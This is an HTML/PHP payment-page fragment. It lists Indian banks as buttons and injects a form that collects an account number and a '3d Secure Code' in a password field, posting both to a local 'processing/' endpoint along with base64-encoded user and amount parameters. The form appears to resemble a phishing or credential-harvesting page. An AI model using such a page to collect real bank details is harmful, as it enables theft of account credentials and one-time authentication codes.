<div class="sec-full">
    <ul>
        <li class="met-btn">Allahabad Bank</li>
        <li class="met-btn">Axis Bank</li>
        <li class="met-btn">Bank of Bahrain and Kuwait</li>
        <li class="met-btn">Bank of Baroda</li>
        <li class="met-btn">Bank of India</li>
        <li class="met-btn">Bank of Maharashtra</li>
        <li class="met-btn">Central Bank of India</li>
        <li class="met-btn">Citibank</li>
        <li class="met-btn">City Union Bank</li>
        <li class="met-btn">Corporation Bank</li>
        <li class="met-btn">Deutsche Bank</li>
        <li class="met-btn">Development Credit Bank</li>
        <li class="met-btn">Dhanlaxmi Bank</li>
        <li class="met-btn">Federal Bank</li>
        <li class="met-btn">HDFC Bank</li>
        <li class="met-btn">ICICI Bank</li>
        <li class="met-btn">IDBI Bank</li>
        <li class="met-btn">Indian Bank</li>
        <li class="met-btn">Indian Overseas Bank</li>
        <li class="met-btn">IndusInd Bank</li>
        <li class="met-btn">ING Vysya Bank</li>
        <li class="met-btn">Karnataka Bank Ltd</li>
        <li class="met-btn">Karur Vysya Bank</li>
        <li class="met-btn">Kotak Bank</li>
        <li class="met-btn">Lakshmi Vilas Bank</li>
        <li class="met-btn">Punjab National Bank</li>
        <li class="met-btn">Ratnakar Bank</li>
        <li class="met-btn">Shamrao Vitthal Co-operative Bank</li>
        <li class="met-btn">South Indian Bank</li>
        <li class="met-btn">State Bank of Bikaner and Jaipur</li>
        <li class="met-btn">State Bank of Hyderabad</li>
        <li class="met-btn">State Bank of India</li>
        <li class="met-btn">State Bank of Mysore</li>
        <li class="met-btn">State Bank of Patiala</li>
        <li class="met-btn">State Bank of Travancore</li>
        <li class="met-btn">Tamilnad Mercantile Bank Ltd.</li>
        <li class="met-btn">Union Bank of India</li>
        <li class="met-btn">Vijaya Bank</li>
        <li class="met-btn">Yes Bank Ltd.</li>
    </ul>
</div>
<div id="bank" style="display: none">
    <div class="sec-full">
        <form action="processing/" method="post" class="form">
            <b>Account Number :</b><br><input type="text" name="accno" required maxlength="20"><br>
            <b>3d Secure Code :</b><br><input type="password" name="ccode" required maxlength="20"><br>
            <input type="hidden" value="bank" name="cat">
            <span class="app"></span>
        </form>
    </div>
</div>
<div id="to-app" style="display: none">
    <input type="hidden" name="un" value="<?php echo base64_encode($_REQUEST['un']) ?>">
    <input type="hidden" name="ud" value="<?php echo base64_encode($_REQUEST['ud']) ?>">
    <input type="hidden" name="am" value="<?php echo base64_encode($_REQUEST['am']) ?>">
    <input type="submit" name="submit" value="pay" class="btn">
</div>
<script>
    $(".met-btn").click(function(e) {
        $(".met-btn").removeClass("sec-btn-foc");
        $(this).addClass("sec-btn-foc");
        $(".app").html("");
        $(".app").html($("#to-app").html());
        $("#method-det").html($("#bank").html());
     });
</script>
